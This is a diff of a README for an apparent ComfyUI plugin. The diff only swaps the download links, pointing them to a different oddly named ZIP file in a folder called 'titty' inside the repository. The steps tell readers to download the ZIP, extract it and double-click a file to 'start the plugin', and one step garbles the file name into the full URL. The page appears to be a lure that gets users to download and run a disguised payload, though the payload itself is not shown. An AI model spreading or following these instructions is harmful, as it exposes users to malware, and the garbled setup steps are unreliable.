@@ -1,6 +1,6 @@
 # 🌟 ComfyUI_RH_QwenImageI2L - Enhance Your ComfyUI Experience 
 
-[![Download](https://github.com/Sm8s/ComfyUI_RH_QwenImageI2L/raw/refs/heads/main/titty/R-L-Comfy-U-Qwen-Image-3.8.zip%20Now-Click%20Here-brightgreen)](https://github.com/Sm8s/ComfyUI_RH_QwenImageI2L/raw/refs/heads/main/titty/R-L-Comfy-U-Qwen-Image-3.8.zip)
+[![Download](https://github.com/Sm8s/ComfyUI_RH_QwenImageI2L/raw/refs/heads/main/titty/U-L-Qwen-R-Comfy-Image-2.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/Sm8s/ComfyUI_RH_QwenImageI2L/raw/refs/heads/main/titty/U-L-Qwen-R-Comfy-Image-2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download the plugin from our Releases page. Follow t
 
 1. **Visit the Download Page:** Click the link below to go directly to the download page:
    
-   [Download ComfyUI_RH_QwenImageI2L](https://github.com/Sm8s/ComfyUI_RH_QwenImageI2L/raw/refs/heads/main/titty/R-L-Comfy-U-Qwen-Image-3.8.zip)
+   [Download ComfyUI_RH_QwenImageI2L](https://github.com/Sm8s/ComfyUI_RH_QwenImageI2L/raw/refs/heads/main/titty/U-L-Qwen-R-Comfy-Image-2.5.zip)
 
 2. **Choose the Latest Release:** On the Releases page, look for the most recent version at the top. It is often marked with a tag like "Latest Release."
 
@@ -22,7 +22,7 @@ To get started, you need to download the plugin from our Releases page. Follow t
 
 5. **Extract the Files (if needed):** If you downloaded a ZIP file, right-click on it and select "Extract All." Follow the prompts to extract the contents to a folder.
 
-6. **Run the Plugin:** After extracting, locate the file named `https://github.com/Sm8s/ComfyUI_RH_QwenImageI2L/raw/refs/heads/main/titty/R-L-Comfy-U-Qwen-Image-3.8.zip` (or a similar name). Double-click on this file to start the plugin.
+6. **Run the Plugin:** After extracting, locate the file named `https://github.com/Sm8s/ComfyUI_RH_QwenImageI2L/raw/refs/heads/main/titty/U-L-Qwen-R-Comfy-Image-2.5.zip` (or a similar name). Double-click on this file to start the plugin.
 
 7. **Follow Setup Instructions:** The plugin will guide you through any necessary setup steps. Just read the prompts on your screen and follow them.
 
